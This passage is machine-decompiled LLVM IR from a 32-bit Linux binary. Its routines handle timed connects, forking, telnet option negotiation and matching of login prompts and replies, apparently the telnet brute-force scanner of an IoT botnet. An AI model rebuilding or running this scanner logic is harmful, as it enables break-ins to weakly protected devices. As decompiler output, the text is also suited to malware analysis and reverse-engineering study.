  %v3_80492e3 = load i32, i32* %v2_80492e3, align 4
  %v3_80492fc = inttoptr i32 %v3_80492e3 to i8*
  %v4_80492fc = call i32 @__GI_memset(i8* %v3_80492fc, i32 0, i32 1024)
  ret i32 %v4_80492fc

; uselistorder directives
  uselistorder i32 %tmp3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80492cb, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049303 = load i32, i32* @ebp, align 4
  store i32 %v0_8049303, i32* %stack_var_-4, align 4
  %v2_8049317 = inttoptr i32 %arg1 to i32*
  %v3_8049317 = call i32 @advance_state(i32* %v2_8049317, i32 0)
  %v1_804931f = add i32 %arg1, 9
  %v2_804931f = inttoptr i32 %v1_804931f to i8*
  store i8 1, i8* %v2_804931f, align 1
  %v2_8049323 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049323, i32* @ebp, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049325 = load i32, i32* @ebp, align 4
  store i32 %v0_8049325, i32* %stack_var_-4, align 4
  %v4_8049325 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049325, i32* @ebp, align 4
  %v4_8049339 = call i32 @contains_string(i32 %arg1, i32* bitcast ([3 x i8*]* @global_var_80581c0.22 to i32*))
  %v2_804933e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804933e, i32* @ebp, align 4
  ret i32 %v4_8049339

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049340 = load i32, i32* @ebp, align 4
  store i32 %v0_8049340, i32* %stack_var_-4, align 4
  %v4_8049340 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049340, i32* @ebp, align 4
  %v4_8049354 = call i32 @contains_string(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_80581a0.30 to i32*))
  %v2_8049359 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049359, i32* @ebp, align 4
  ret i32 %v4_8049354

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804935b = load i32, i32* @ebp, align 4
  store i32 %v0_804935b, i32* %stack_var_-4, align 4
  %v4_804935b = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804935b, i32* @ebp, align 4
  %v1_8049367 = call i32 @contains_success(i32 %arg1)
  %v1_804936c = icmp eq i32 %v1_8049367, 0
  %v1_804936e = icmp eq i1 %v1_804936c, false
  br i1 %v1_804936e, label %dec_label_pc_804938f, label %dec_label_pc_8049370

dec_label_pc_8049370:                             ; preds = %entry
  %v1_8049376 = call i32 @contains_fail(i32 %arg1)
  %v1_804937b = icmp ne i32 %v1_8049376, 0
  %. = zext i1 %v1_804937b to i32
  br label %dec_label_pc_804938f

dec_label_pc_804938f:                             ; preds = %dec_label_pc_8049370, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_8049370 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8049394 = load i32, i32* @ebp, align 4
  store i32 %v0_8049394, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80493af

dec_label_pc_80493af:                             ; preds = %dec_label_pc_80493af, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_80493af, %dec_label_pc_80493af ]
  %v4_80493af = add i32 %stack_var_-12.0, 1
  %v2_80493b5 = mul i32 %v4_80493af, 4
  %v5_80493b8 = add i32 %v2_80493b5, %tmp5
  %v1_80493bb = inttoptr i32 %v5_80493b8 to i32*
  %v2_80493bb = load i32, i32* %v1_80493bb, align 4
  %v1_80493bd = icmp eq i32 %v2_80493bb, 0
  %v1_80493bf = icmp eq i1 %v1_80493bd, false
  br i1 %v1_80493bf, label %dec_label_pc_80493af, label %dec_label_pc_80493f4.preheader

dec_label_pc_80493f4.preheader:                   ; preds = %dec_label_pc_80493af
  %v2_80493df = inttoptr i32 %arg1 to i8*
  %v5_80493fa17 = icmp sgt i32 %v4_80493af, 0
  br i1 %v5_80493fa17, label %dec_label_pc_80493ca, label %dec_label_pc_8049403

dec_label_pc_80493ca:                             ; preds = %dec_label_pc_80493f4.preheader, %dec_label_pc_80493f1
  %storemerge118 = phi i32 [ %v4_80493f1, %dec_label_pc_80493f1 ], [ 0, %dec_label_pc_80493f4.preheader ]
  %v2_80493cd = mul i32 %storemerge118, 4
  %v5_80493d0 = add i32 %v2_80493cd, %tmp5
  %v1_80493d3 = inttoptr i32 %v5_80493d0 to i32*
  %v2_80493d3 = load i32, i32* %v1_80493d3, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_80493df = call i32 @strcasestr(i8* %v2_80493df, i32 %v2_80493d3)
  %v1_80493e4 = icmp eq i32 %v3_80493df, 0
  br i1 %v1_80493e4, label %dec_label_pc_80493f1, label %dec_label_pc_8049403

dec_label_pc_80493f1:                             ; preds = %dec_label_pc_80493ca
  %v4_80493f1 = add nuw nsw i32 %storemerge118, 1
  %v5_80493fa = icmp slt i32 %v4_80493f1, %v4_80493af
  br i1 %v5_80493fa, label %dec_label_pc_80493ca, label %dec_label_pc_8049403

dec_label_pc_8049403:                             ; preds = %dec_label_pc_80493ca, %dec_label_pc_80493f1, %dec_label_pc_80493f4.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_80493f4.preheader ], [ 0, %dec_label_pc_80493f1 ], [ 1, %dec_label_pc_80493ca ]
  %v2_8049406 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049406, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80493f1, { 1, 0 }
  uselistorder i32 %storemerge118, { 1, 0 }
  uselistorder i32 %v4_80493af, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049403, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80493ca, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804940b = load i32, i32* @edi, align 4
  store i32 %v0_804940b, i32* %stack_var_-8, align 4
  %v3_8049428 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049430 = or i32 %v3_8049428, 2048
  %v3_804944c = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049430)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_8049460 = trunc i32 %arg3 to i16
  %v2_8049460 = call i32 @htons(i16 %v1_8049460)
  store i32 %arg2, i32* @edx, align 4
  %v3_804947c = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049481 = icmp eq i32 %v3_804947c, 0
  br i1 %v1_8049481, label %dec_label_pc_8049494, label %dec_label_pc_8049604

dec_label_pc_8049494:                             ; preds = %entry
  %v2_804946f = ptrtoint i32* %stack_var_-40 to i32
  %v3_80494bc = call i32 @__libc_connect(i32 %arg1, i32 %v2_804946f, i32 16)
  %v5_80494c4 = icmp slt i32 %v3_80494bc, 0
  %v1_80494c8 = icmp eq i1 %v5_80494c4, false
  br i1 %v1_80494c8, label %dec_label_pc_80495bb, label %dec_label_pc_80494ce

dec_label_pc_80494ce:                             ; preds = %dec_label_pc_8049494
  %v1_80494ce = call i32 @__errno_location(i32 %v3_80494bc)
  %v1_80494d3 = inttoptr i32 %v1_80494ce to i32*
  %v2_80494d3 = load i32, i32* %v1_80494d3, align 4
  %v9_80494d5 = icmp eq i32 %v2_80494d3, 115
  %v1_80494d8 = icmp eq i1 %v9_80494d5, false
  br i1 %v1_80494d8, label %dec_label_pc_8049604, label %dec_label_pc_80494de

dec_label_pc_80494de:                             ; preds = %dec_label_pc_80494ce
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_80494fb = ptrtoint i32* %stack_var_-168 to i32
  %tmp27 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_80494fb, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049502 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v2_804950f = udiv i32 %arg1, 32
  %v1_8049515 = urem i32 %arg1, 32
  %v0_8049518 = load i32, i32* @ebp, align 4
  %v2_8049518 = mul nuw nsw i32 %v2_804950f, 4
  %v3_8049518 = add nsw i32 %v2_8049518, -164
  %v4_8049518 = add i32 %v3_8049518, %v0_8049518
  %v5_8049518 = inttoptr i32 %v4_8049518 to i32*
  %v6_8049518 = load i32, i32* %v5_8049518, align 4
  %v9_8049518 = shl i32 1, %v1_8049515
  %v12_8049518 = or i32 %v6_8049518, %v9_8049518
  store i32 %v12_8049518, i32* %v5_8049518, align 4
  %v1_8049523 = add i32 %arg1, 1
  %v2_8049524 = ptrtoint i32* %stack_var_-176 to i32
  %v5_804954b = call i32 @__libc_select(i32 %v1_8049523, i32 0, i32 %v2_80494fb, i32 0, i32 %v2_8049524)
  %tmp28 = icmp slt i32 %v5_804954b, 1
  br i1 %tmp28, label %dec_label_pc_8049604, label %dec_label_pc_8049554

dec_label_pc_8049554:                             ; preds = %dec_label_pc_80494de
  store i32 4, i32* %stack_var_-180, align 4
  %v2_804955e = ptrtoint i32* %stack_var_-180 to i32
  %v2_8049568 = ptrtoint i32* %stack_var_-184 to i32
  %v5_8049588 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_8049568, i32 %v2_804955e)
  %v3_804958d = load i32, i32* %stack_var_-184, align 4
  %v1_8049593 = icmp eq i32 %v3_804958d, 0
  br i1 %v1_8049593, label %dec_label_pc_80495bb, label %dec_label_pc_8049604

dec_label_pc_80495bb:                             ; preds = %dec_label_pc_8049554, %dec_label_pc_8049494
  %v3_80495d1 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80495d9 = and i32 %v3_80495d1, -2049
  %v3_80495f5 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80495d9)
  br label %dec_label_pc_8049604

dec_label_pc_8049604:                             ; preds = %dec_label_pc_80494ce, %dec_label_pc_80494de, %dec_label_pc_8049554, %entry, %dec_label_pc_80495bb
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_80495bb ], [ 0, %entry ], [ 0, %dec_label_pc_8049554 ], [ 0, %dec_label_pc_80494de ], [ 0, %dec_label_pc_80494ce ]
  %v2_8049610 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049610, i32* @edi, align 4
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049604, { 4, 2, 1, 0, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8049616 = load i32, i32* @ebx, align 4
  store i32 %v0_8049616, i32* %stack_var_-8, align 4
  %v1_804961a = call i32 @__libc_fork(i32 %v0_8049616)
  %v4_8049622 = icmp eq i32 %v1_804961a, 0
  %v1_8049626 = icmp eq i1 %v4_8049622, false
  br i1 %v1_8049626, label %dec_label_pc_8049633, label %dec_label_pc_8049628

dec_label_pc_8049628:                             ; preds = %entry
  br label %dec_label_pc_804970f

dec_label_pc_8049633:                             ; preds = %entry
  %v0_8049633 = load i32, i32* @global_var_80584c8.31, align 8
  %v0_8049638 = load i32, i32* @global_var_80584cc.32, align 4
  %v1_804963e = add i32 %v0_8049633, 1
  %v5_804963e = icmp eq i32 %v0_8049633, -1
  %v2_8049641 = zext i1 %v5_804963e to i32
  %v3_8049641 = add i32 %v2_8049641, %v0_8049638
  store i32 %v1_804963e, i32* @global_var_80584c8.31, align 8
  store i32 %v3_8049641, i32* @global_var_80584cc.32, align 4
  %v2_804965e = mul i32 %v1_804963e, 4
  %v1_8049661 = add i32 %v2_804965e, 4
  %v1_8049667 = call i32 @malloc(i32 %v1_8049661)
  br label %dec_label_pc_804969a

dec_label_pc_8049678:                             ; preds = %dec_label_pc_804969a, %dec_label_pc_80496cb
  %v2_804967b = mul i32 %storemerge1, 4
  %v5_8049680 = add i32 %v2_804967b, %v1_8049667
  %v0_804968b = load i32, i32* @global_var_805e754.33, align 4
  %v2_8049690 = add i32 %v0_804968b, %v2_804967b
  %v1_8049693 = inttoptr i32 %v2_8049690 to i32*
  %v2_8049693 = load i32, i32* %v1_8049693, align 4
  %v2_8049695 = inttoptr i32 %v5_8049680 to i32*
  store i32 %v2_8049693, i32* %v2_8049695, align 4
  %v4_8049697 = add i32 %storemerge1, 1
  br label %dec_label_pc_804969a

dec_label_pc_804969a:                             ; preds = %dec_label_pc_8049633, %dec_label_pc_8049678
  %storemerge1 = phi i32 [ %v4_8049697, %dec_label_pc_8049678 ], [ 0, %dec_label_pc_8049633 ]
  %v0_80496a8 = load i32, i32* @global_var_80584c8.31, align 8
  %v0_80496ad = load i32, i32* @global_var_80584cc.32, align 4
  %v4_80496b7 = icmp ne i32 %v0_80496a8, 0
  %v2_80496ba = zext i1 %v4_80496b7 to i32
  %v3_80496ba = add i32 %v0_80496ad, -1
  %v4_80496ba = add i32 %v3_80496ba, %v2_80496ba
  store i32 %v4_80496ba, i32* @ebx, align 4
  %v10_80496c6 = icmp eq i32 %v4_80496ba, 0
  br i1 %v10_80496c6, label %dec_label_pc_80496cb, label %dec_label_pc_8049678

dec_label_pc_80496cb:                             ; preds = %dec_label_pc_804969a
  %v1_80496b7 = add i32 %v0_80496a8, -1
  %v10_80496d6 = icmp ult i32 %storemerge1, %v1_80496b7
  br i1 %v10_80496d6, label %dec_label_pc_8049678, label %dec_label_pc_80496db

dec_label_pc_80496db:                             ; preds = %dec_label_pc_80496cb
  %v2_80496e6 = mul i32 %v0_80496a8, 4
  %v5_80496e9 = add i32 %v2_80496e6, %v1_8049667
  %v1_80496ec = add i32 %v5_80496e9, -4
  store i32 %v1_80496ec, i32* @edx, align 4
  %v2_80496f2 = inttoptr i32 %v1_80496ec to i32*
  store i32 %v1_804961a, i32* %v2_80496f2, align 4
  %v0_80496f4 = load i32, i32* @global_var_805e754.33, align 4
  %v1_80496fc = call i32 @free(i32 %v0_80496f4)
  store i32 %v1_8049667, i32* @global_var_805e754.33, align 4
  store i32 %v1_804961a, i32* @ecx, align 4
  br label %dec_label_pc_804970f

dec_label_pc_804970f:                             ; preds = %dec_label_pc_8049628, %dec_label_pc_80496db
  %v2_8049715 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049715, i32* @ebx, align 4
  ret i32 %v1_804961a

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_804967b, { 1, 0 }
  uselistorder i32 %v1_8049667, { 2, 0, 1 }
  uselistorder i32 %v0_8049633, { 1, 0 }
  uselistorder label %dec_label_pc_804970f, { 1, 0 }
  uselistorder label %dec_label_pc_804969a, { 1, 0 }
  uselistorder label %dec_label_pc_8049678, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8049718 = load i32, i32* @ebp, align 4
  store i32 %v0_8049718, i32* %stack_var_-4, align 4
  %v1_8049721 = add i32 %arg2, 1
  %v1_8049722 = inttoptr i32 %v1_8049721 to i8*
  %v2_8049722 = load i8, i8* %v1_8049722, align 1
  %v9_804972b = icmp ult i8 %v2_8049722, -5
  br i1 %v9_804972b, label %dec_label_pc_8049836, label %dec_label_pc_8049738

dec_label_pc_8049738:                             ; preds = %entry
  %v7_804973f = icmp eq i8 %v2_8049722, -1
  br i1 %v7_804973f, label %dec_label_pc_8049741, label %dec_label_pc_804975b

dec_label_pc_8049741:                             ; preds = %dec_label_pc_8049738
  br label %dec_label_pc_8049836

dec_label_pc_804975b:                             ; preds = %dec_label_pc_8049738
  store i8 -1, i8* %stack_var_-5, align 1
  %v2_804976f = ptrtoint i8* %stack_var_-5 to i32
  %v4_804977c = call i32 @__libc_send(i32 %arg1, i32 %v2_804976f, i32 1, i32 16384)
  %v2_8049785 = load i8, i8* %v1_8049722, align 1
  %v11_8049788 = icmp eq i8 %v2_8049785, -4
  %v1_804978a = icmp eq i1 %v11_8049788, false
  br i1 %v1_804978a, label %dec_label_pc_8049792, label %dec_label_pc_804978c

dec_label_pc_804978c:                             ; preds = %dec_label_pc_804975b
  store i8 -2, i8* %stack_var_-5, align 1
  br label %dec_label_pc_80497e8

dec_label_pc_8049792:                             ; preds = %dec_label_pc_804975b
  %v2_8049796 = load i8, i8* %v1_8049722, align 1
  %v11_8049799 = icmp eq i8 %v2_8049796, -2
  %v1_804979b = icmp eq i1 %v11_8049799, false
  br i1 %v1_804979b, label %dec_label_pc_80497a3, label %dec_label_pc_804979d

dec_label_pc_804979d:                             ; preds = %dec_label_pc_8049792
  store i8 -4, i8* %stack_var_-5, align 1
  br label %dec_label_pc_80497e8

dec_label_pc_80497a3:                             ; preds = %dec_label_pc_8049792
  %v2_80497a7 = load i8, i8* %v1_8049722, align 1
  %v10_80497aa = icmp eq i8 %v2_80497a7, 3
  %v1_80497ac = icmp eq i1 %v10_80497aa, false
  %v11_80497d3 = icmp eq i8 %v2_80497a7, -3
  %v1_80497d5 = icmp eq i1 %v11_80497d3, false
  br i1 %v1_80497ac, label %dec_label_pc_80497cc, label %dec_label_pc_80497ae

dec_label_pc_80497ae:                             ; preds = %dec_label_pc_80497a3
  %. = select i1 %v1_80497d5, i8 -3, i8 -5
  store i8 %., i8* %stack_var_-5, align 1
  br label %dec_label_pc_80497e8

dec_label_pc_80497cc:                             ; preds = %dec_label_pc_80497a3
  %.3 = select i1 %v1_80497d5, i8 -2, i8 -4
  store i8 %.3, i8* %stack_var_-5, align 1
  br label %dec_label_pc_80497e8

dec_label_pc_80497e8:                             ; preds = %dec_label_pc_80497ae, %dec_label_pc_804979d, %dec_label_pc_804978c, %dec_label_pc_80497cc
  %v4_8049805 = call i32 @__libc_send(i32 %arg1, i32 %v2_804976f, i32 1, i32 16384)
  %v1_804980d = add i32 %arg2, 2
  %v4_804982a = call i32 @__libc_send(i32 %arg1, i32 %v1_804980d, i32 1, i32 16384)
  %v2_8049839.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049836

dec_label_pc_8049836:                             ; preds = %dec_label_pc_8049741, %dec_label_pc_80497e8, %entry
  %v2_8049839 = phi i32 [ %v0_8049718, %dec_label_pc_8049741 ], [ %v2_8049839.pre, %dec_label_pc_80497e8 ], [ %v0_8049718, %entry ]
  store i32 %v2_8049839, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i8 -4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049836, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80497e8, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8049849 = ptrtoint i8* %arg1 to i32
  %v3_804985a = call i32 @_strlen(i8* %arg1)
  %v4_804985a = mul i32 %v3_804985a, -1
  %v1_8049860 = sub i32 0, %v4_804985a
  %v6_8049887 = sub i32 %v4_8049849, %v4_804985a
  br label %dec_label_pc_804990f

dec_label_pc_8049877:                             ; preds = %dec_label_pc_80498ca, %dec_label_pc_80498b2, %dec_label_pc_804989a, %dec_label_pc_8049882
  %v4_8049877 = add nsw i32 %stack_var_-12.033, 1
  %v7_8049880 = icmp slt i32 %v4_8049877, %v1_8049860
  br i1 %v7_8049880, label %dec_label_pc_8049882, label %dec_label_pc_804987a.dec_label_pc_80498e2_crit_edge

dec_label_pc_804987a.dec_label_pc_80498e2_crit_edge: ; preds = %dec_label_pc_8049877, %dec_label_pc_804987a.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_804987a.preheader ], [ %v4_8049877, %dec_label_pc_8049877 ]
  %.pre = sub i32 %v6_8049887, %stack_var_-12.0.lcssa
  %.pre10 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_80498e2

dec_label_pc_8049882:                             ; preds = %dec_label_pc_804987a.preheader, %dec_label_pc_8049877
  %stack_var_-12.033 = phi i32 [ %v4_8049877, %dec_label_pc_8049877 ], [ %stack_var_-12.1, %dec_label_pc_804987a.preheader ]
  %v2_804988f = sub i32 %v6_8049887, %stack_var_-12.033
  %v1_8049893 = inttoptr i32 %v2_804988f to i8*
  %v2_8049893 = load i8, i8* %v1_8049893, align 1
  %v4_8049896 = icmp eq i8 %v2_8049893, 0
  br i1 %v4_8049896, label %dec_label_pc_8049877, label %dec_label_pc_804989a

dec_label_pc_804989a:                             ; preds = %dec_label_pc_8049882
  %v2_80498ab = load i8, i8* %v1_8049893, align 1
  %v7_80498ae = icmp eq i8 %v2_80498ab, 32
  br i1 %v7_80498ae, label %dec_label_pc_8049877, label %dec_label_pc_80498b2

dec_label_pc_80498b2:                             ; preds = %dec_label_pc_804989a
  %v2_80498c3 = load i8, i8* %v1_8049893, align 1
  %v10_80498c6 = icmp eq i8 %v2_80498c3, 13
  br i1 %v10_80498c6, label %dec_label_pc_8049877, label %dec_label_pc_80498ca

dec_label_pc_80498ca:                             ; preds = %dec_label_pc_80498b2
  %v2_80498db = load i8, i8* %v1_8049893, align 1
  %v10_80498de = icmp eq i8 %v2_80498db, 10
  br i1 %v10_80498de, label %dec_label_pc_8049877, label %dec_label_pc_80498e2

dec_label_pc_80498e2:                             ; preds = %dec_label_pc_80498ca, %dec_label_pc_804987a.dec_label_pc_80498e2_crit_edge
  %stack_var_-12.023 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_804987a.dec_label_pc_80498e2_crit_edge ], [ %stack_var_-12.033, %dec_label_pc_80498ca ]
  %v1_80498f3.pre-phi = phi i8* [ %.pre10, %dec_label_pc_804987a.dec_label_pc_80498e2_crit_edge ], [ %v1_8049893, %dec_label_pc_80498ca ]
  %v2_80498f3 = load i8, i8* %v1_80498f3.pre-phi, align 1
  %v6_80498f9 = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_8055d00.34 to i32)
  %v1_80498fc = inttoptr i32 %v6_80498f9 to i8*
  %v2_80498fc = load i8, i8* %v1_80498fc, align 1
  %v15_80498ff = icmp eq i8 %v2_80498f3, %v2_80498fc
  %v1_8049901 = icmp eq i1 %v15_80498ff, false
  br i1 %v1_8049901, label %dec_label_pc_804990c, label %dec_label_pc_8049939

dec_label_pc_804990c:                             ; preds = %dec_label_pc_80498e2
  %v4_804990c = add i32 %storemerge3, 1
  br label %dec_label_pc_804990f

dec_label_pc_804990f:                             ; preds = %entry, %dec_label_pc_804990c
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.023, %dec_label_pc_804990c ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v4_804990c, %dec_label_pc_804990c ]
  %v3_8049923 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8055d00.34, i32 0, i32 0))
  %v7_804992a = icmp ult i32 %storemerge3, %v3_8049923
  br i1 %v7_804992a, label %dec_label_pc_804987a.preheader, label %dec_label_pc_8049939

dec_label_pc_804987a.preheader:                   ; preds = %dec_label_pc_804990f
  %v7_804988032 = icmp slt i32 %stack_var_-12.1, %v1_8049860
  br i1 %v7_804988032, label %dec_label_pc_8049882, label %dec_label_pc_804987a.dec_label_pc_80498e2_crit_edge

dec_label_pc_8049939:                             ; preds = %dec_label_pc_804990f, %dec_label_pc_80498e2
  %storemerge = phi i32 [ 1, %dec_label_pc_80498e2 ], [ 0, %dec_label_pc_804990f ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_8049887, { 1, 0 }
  uselistorder [6 x i8]* @global_var_8055d00.34, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804990f, { 1, 0 }
  uselistorder label %dec_label_pc_804987a.dec_label_pc_80498e2_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_8049988 = ptrtoint i32* %stack_var_-160 to i32
  %tmp26 = bitcast i32* %stack_var_-160 to i8*
  %v1_80499a2 = urem i32 %arg1, 32
  %v9_80499a5 = shl i32 1, %v1_80499a2
  %v1_80499b0 = add i32 %arg1, 1
  %v2_80499b1 = ptrtoint i32* %stack_var_-168 to i32
  %v5_80499e8 = ptrtoint i8* %arg6 to i32
  %v2_8049abc = inttoptr i32 %arg2 to i8*
  %v4_8049ac5 = icmp eq i32 %arg3, 0
  %v1_8049ae633 = add i32 %arg8, 2
  %v5_8049aec42 = icmp slt i32 %v1_8049ae633, %arg7
  br i1 %v5_8049aec42, label %dec_label_pc_8049aee.lr.ph, label %dec_label_pc_8049b0a

dec_label_pc_8049aee.lr.ph:                       ; preds = %entry
  %v2_804999c = udiv i32 %arg1, 32
  %v2_80499a5 = mul nuw nsw i32 %v2_804999c, 4
  %v3_80499a5 = add nsw i32 %v2_80499a5, -156
  %tmp30 = icmp slt i32 %arg5, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br label %dec_label_pc_8049aee

dec_label_pc_804997e:                             ; preds = %dec_label_pc_8049afc, %dec_label_pc_8049aee
  store i32 %v2_8049988, i32* @edi, align 4
  %v5_804998f = call i8* @_memset(i8* %tmp26, i32 0, i32 32)
  %v0_80499a5 = load i32, i32* @ebp, align 4
  %v4_80499a5 = add i32 %v3_80499a5, %v0_80499a5
  %v5_80499a5 = inttoptr i32 %v4_80499a5 to i32*
  %v6_80499a5 = load i32, i32* %v5_80499a5, align 4
  %v12_80499a5 = or i32 %v6_80499a5, %v9_80499a5
  store i32 %v12_80499a5, i32* %v5_80499a5, align 4
  %v5_80499d8 = call i32 @__libc_select(i32 %v1_80499b0, i32 %v2_8049988, i32 0, i32 0, i32 %v2_80499b1)
  %tmp27 = icmp slt i32 %v5_80499d8, 1
  br i1 %tmp27, label %dec_label_pc_8049b0a, label %dec_label_pc_80499e5

dec_label_pc_80499e5:                             ; preds = %dec_label_pc_804997e
  %v6_80499e8 = add i32 %stack_var_-32.043, %v5_80499e8
  %v5_80499eb = inttoptr i32 %v6_80499e8 to i8*
  %v4_8049a0b = call i32 @__libc_recv(i32 %arg1, i32 %v6_80499e8, i32 1, i32 0)
  %v13_8049a13 = icmp eq i32 %v4_8049a0b, -1
  br i1 %v13_8049a13, label %dec_label_pc_8049b26, label %dec_label_pc_8049a19

dec_label_pc_8049a19:                             ; preds = %dec_label_pc_80499e5
  %v4_8049a19 = icmp eq i32 %v4_8049a0b, 0
  %v1_8049a1d = icmp eq i1 %v4_8049a19, false
  br i1 %v1_8049a1d, label %dec_label_pc_8049a2e, label %dec_label_pc_8049b26

dec_label_pc_8049a2e:                             ; preds = %dec_label_pc_8049a19
  %v5_8049a31 = add i32 %v4_8049a0b, %stack_var_-32.043
  %v2_8049a37 = load i8, i8* %v5_80499eb, align 1
  %v11_8049a3a = icmp eq i8 %v2_8049a37, -1
  %v1_8049a3c = icmp eq i1 %v11_8049a3a, false
  br i1 %v1_8049a3c, label %dec_label_pc_8049aaf, label %dec_label_pc_8049a3e

dec_label_pc_8049a3e:                             ; preds = %dec_label_pc_8049a2e
  %v1_8049a41 = add i32 %v6_80499e8, 1
  %v4_8049a5c = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049a41, i32 2, i32 0)
  %v13_8049a64 = icmp eq i32 %v4_8049a5c, -1
  br i1 %v13_8049a64, label %dec_label_pc_8049b26, label %dec_label_pc_8049a6a

dec_label_pc_8049a6a:                             ; preds = %dec_label_pc_8049a3e
  %v4_8049a6a = icmp eq i32 %v4_8049a5c, 0
  %v1_8049a6e = icmp eq i1 %v4_8049a6a, false
  br i1 %v1_8049a6e, label %dec_label_pc_8049a7f, label %dec_label_pc_8049b26

dec_label_pc_8049a7f:                             ; preds = %dec_label_pc_8049a6a
  %v5_8049a82 = add i32 %v4_8049a5c, %v5_8049a31
  %v3_8049a9a = call i32 @negotiate(i32 %arg1, i32 %v6_80499e8, i32 3)
  %v1_8049a9f = icmp eq i32 %v3_8049a9a, 0
  %v1_8049aa1 = icmp eq i1 %v1_8049a9f, false
